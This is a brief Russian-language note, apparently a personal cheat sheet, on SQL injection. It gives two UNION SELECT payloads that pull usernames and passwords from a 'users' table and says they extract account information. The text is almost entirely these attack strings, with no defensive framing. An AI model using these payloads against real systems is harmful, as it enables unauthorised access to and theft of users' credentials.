SQL injection 

Если у другого столбца не string а числа то можно обойтись другим способом:

' union select null, username from users--
' union select null, password from users--

таким образом можно будет извлечь нужную информацию об аккаунте